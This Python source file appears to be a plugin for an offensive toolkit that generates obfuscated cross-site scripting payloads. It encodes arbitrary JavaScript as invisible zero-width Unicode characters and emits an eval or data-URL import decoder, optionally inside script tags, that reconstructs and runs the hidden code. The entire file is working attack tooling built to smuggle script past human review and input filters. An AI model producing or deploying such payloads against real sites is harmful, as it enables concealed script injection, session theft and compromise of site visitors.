"""Zero-width XSS payload generator."""

from __future__ import annotations

__all__ = ["PLUGIN", "generate"]

PLUGIN = {
    "api_version": "1",
    "type": "generator",
    "kind": "xss_zero_width",
    "entrypoint": "generate",
    "summary": "Hide user-supplied JavaScript in a zero-width eval wrapper.",
    "requires_python": [],
    "requires_system": [],
}

ZERO = "\u200b"
ONE = "\u200c"


def _encode(source: str) -> str:
    bits = "".join(format(ord(char), "b").zfill(8) for char in source)
    return bits.replace("0", ZERO).replace("1", ONE)


def generate(
        payload: str, 
        tags: bool = False,
        type: str = "eval"
    ) -> str:
    """
    Hide a user-supplied payload inside a zero-width JavaScript eval wrapper.

    Params:
    - payload: JavaScript or HTML/JS markup to encode.
    - tags: If true, wrap the supplied payload in <script></script> before encoding.
    - type: Eval (Native, Synchronous, Short decoder length and no ESM support) or Import (Limited (requires polyfills), Asynchronous (Promise), Long decoder length and full ESM support)

    Returns:
    - A JavaScript eval string that decodes and runs the hidden payload.
    """
    
    hidden = _encode(payload)

    if type.lower() == "import":
        full = f"await import('data:text/javascript,'+encodeURIComponent('{hidden}'.replace(/./g,c=>+!(c=='{ZERO}')).replace(/.{8}/g,b=>String.fromCharCode('0b'+b))))"
    else:
        full = f'eval("{hidden}".replace(/./g,c=>+!(c=="{ZERO}"))'".replace(/.{8}/g,b=>String.fromCharCode('0b'+b)))"

    return f"<script>{full}</script>" if tags else full 
